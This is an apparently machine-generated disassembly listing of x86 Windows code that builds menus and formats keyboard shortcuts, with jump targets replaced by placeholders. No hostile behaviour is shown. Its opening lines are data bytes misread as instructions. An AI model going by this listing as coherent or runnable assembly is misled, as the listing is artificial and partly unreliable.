add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ecx
inc ecx
add [ eax ] dh
add [ eax ] al
push [ esp + edi ]
inc ebp
add [ esi + 0x45 ] ch
add [ eax - 0x80000000 ] al
mov esi ebx
arpl [ ebx - 0x70 ] bp
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
mov es [ edx ]
fmul [ esi - 0x7137ffbe ]
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
cwde
mov es [ edx ]
cld
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ eax - 0x3ffbd72 ] bl
imul esi [ ebx + 0x74 ] 0x44f27890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + esi * 8 + 0x80044 ] al
add [ eax ] al
pop eax
lea eax [ edx ]
mov ah 0x33
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
sub_44f2c4
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_43e428
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_443cb8
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_44f31c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_44f354
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403f40
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4041b0
sub_44f3a8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_44f591
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fd8
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404128
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fd8
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403fd8
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404128
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404128
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403f40
mov eax esi
call sub_403f40
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403fd8
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_408388
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40424c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_44f354
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404208
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fd8
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404208
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404208
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404208
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f598
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f64
retn
sub_44f5ac
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_404200
push eax
mov eax edi
call sub_404200
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_404200
push eax
mov eax edi
call sub_404400
push eax
mov eax [ esi ]
call sub_404400
pop edx
pop ecx
call sub_408100
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_404200
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4044a0
sub_44f608
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_44f6e3
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44f5ac
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44f5ac
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44f5ac
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44f5ac
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f6ea
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44f3a8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4080b0
test eax eax
jne r-xdata
sub_44f720
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_451cc0
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_451cd0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_44f780
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_451cc0
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_451cc0
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_451cd0
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_451cd0
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44f720
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_44f720
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_451cd0
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_451cd0
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_44f8cc
push ebx
mov ebx eax
mov eax ebx
call sub_44bfbc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_4547dc
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44f904
push ebx
mov ebx eax
mov eax ebx
call sub_44bfd0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f934
push ebx
mov ebx eax
mov eax ebx
call sub_44bfe4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f964
push ebx
mov ebx eax
mov eax ebx
call sub_44c00c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f994
push ebx
mov ebx eax
mov eax ebx
call sub_44c034
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_40434c
je r-xdata
mov al 0x1
pop ebx
retn
sub_44f9c8
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44bff8
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_44fa04
push ebx
mov ebx eax
mov eax ebx
call sub_44c048
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44fa38
push ebx
mov ebx eax
mov eax ebx
call sub_44c05c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44fa6c
push ebx
mov ebx eax
mov eax ebx
call sub_44c070
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40331c
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44faa0
push ebx
mov ebx eax
mov eax ebx
call sub_41efc8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44fac8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_44fae8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_451b28
sub_44fb08
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_451b98
sub_44fb28
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_451bec
sub_44fb48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_44fb64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403f94
sub_44fb88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_451d18
sub_44fba8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_451cf4
sub_44fbc8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_451d08
sub_44fbe8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_44fc14
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41e6d8
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_44f700
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_452624
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_44fc90
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_4545c0
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_451cc0
test eax eax
jg r-xdata
mov edx esi
call sub_452058
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_451cd0
call sub_40316c
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_40316c
lea eax [ esi + 0x44 ]
call sub_40d3ac
lea eax [ esi + 0x78 ]
call sub_40d3ac
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_4500ac
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_4183c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e724
test bl bl
jle r-xdata
call sub_40316c
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_44fd44
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44ff9f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ffa6
lea eax [ ebp - 0x40 ]
call sub_403f40
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_403fd8
mov eax ebx
call sub_451cc0
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_450254
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_40434c
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_451cc0
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_45227c
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_44f3a8
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4042c0
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404400
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_404400
push eax
mov eax ebx
call sub_450254
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_451898
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_40434c
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_404400
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_451cc0
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_450254
mov [ ebp - 0x25 ] eax
sub_44ffbf
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_44fd44
xor eax eax
pop ebp
retn
sub_44ffe4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4538b8
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_452880
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_452d7c
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_44f780
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_450054
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45009e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41d250
mov eax [ ebp - 0x4 ]
call sub_44f608
mov edx eax
mov eax ebx
call sub_451cf4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4500a5
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_4500ac
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_450124
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_41e7a8
sub_4500e8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41eb28
mov eax ebx
call sub_451ca8
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_451ca8
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403368
pop esi
pop ebx
retn
mov eax ebx
call sub_450124
sub_450124
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_450254
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_450124
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_450254
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_450254
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_44ffe4
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax ebp
call sub_450254
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4501f4
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_451cc0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_451cd0
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_451cd0
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_451cd0
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_44f2fc
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_450254
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_44ffe4
mov eax [ rw-data ]
call sub_44f2fc
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_4502a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41ea50
push ebx
push sub_450054
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_4502e4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4504c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45227c
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403fd8
test bh 0x4
je r-xdata
mov eax edi
call sub_4538b8
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40434c
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_422314
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404208
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
